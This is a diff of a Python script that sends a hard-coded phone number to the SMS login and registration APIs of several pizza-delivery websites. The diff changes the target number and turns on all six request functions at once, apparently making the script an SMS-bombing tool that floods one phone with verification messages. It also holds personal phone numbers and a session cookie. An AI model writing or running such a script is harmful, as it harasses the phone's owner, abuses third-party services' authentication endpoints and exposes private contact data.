@@ -1,31 +1,34 @@
 import requests
 from pprint import pprint
-PHONE = "79374903539"
+PHONE = "79519611971"
 def serv1():
-    headers = {
-        'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
-        'Connection': 'keep-alive',
-        'Origin': 'https://surgut.hans-pizza.ru',
-        'Referer': 'https://surgut.hans-pizza.ru/',
-        'Sec-Fetch-Dest': 'empty',
-        'Sec-Fetch-Mode': 'cors',
-        'Sec-Fetch-Site': 'same-site',
-        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
-        'accept': 'application/json',
-        'content-type': 'application/json',
-        'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
-        'sec-ch-ua-mobile': '?0',
-        'sec-ch-ua-platform': '"Windows"',
-        'x-hans-city-code': 'surgut',
-        'x-hans-client-id': '1ec5dcb0-7e0c-4989-9194-536afaf04c1c',
-        'x-hans-device-type': 'site',
-        'x-hans-version-app': '1.2.3',
-    }
-    json_data = {
-        'phone': PHONE,
-    }
-    response = requests.post('https://api.hans-pizza.ru/api/auth/send', headers=headers, json=json_data)
-    print(response.json())
+    try:
+        headers = {
+            'Accept-Language': 'ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7',
+            'Connection': 'keep-alive',
+            'Origin': 'https://surgut.hans-pizza.ru',
+            'Referer': 'https://surgut.hans-pizza.ru/',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-site',
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 Edg/146.0.0.0',
+            'accept': 'application/json',
+            'content-type': 'application/json',
+            'sec-ch-ua': '"Chromium";v="146", "Not-A.Brand";v="24", "Microsoft Edge";v="146"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'x-hans-city-code': 'surgut',
+            'x-hans-client-id': '1ec5dcb0-7e0c-4989-9194-536afaf04c1c',
+            'x-hans-device-type': 'site',
+            'x-hans-version-app': '1.2.3',
+        }
+        json_data = {
+            'phone': PHONE,
+        }
+        response = requests.post('https://api.hans-pizza.ru/api/auth/send', headers=headers, json=json_data)
+        print(response.json())
+    except:
+        print(1)
 def serv2():
     cookies = {
     'PHPSESSID': 'D6jy0b5et4XMzOd3Pfyl6nEYgHoWLcti',
@@ -216,9 +219,9 @@ def serv6():
 
     response = requests.post('https://tichpizza.ru/api/user/register', cookies=cookies, headers=headers, json=json_data)
     print(response.json())
-#serv1()
-#serv2()
-#serv3()
-#serv4()
-#serv5()
-#serv6()
+serv1()
+serv2()
+serv3()
+serv4()
+serv5()
+serv6()
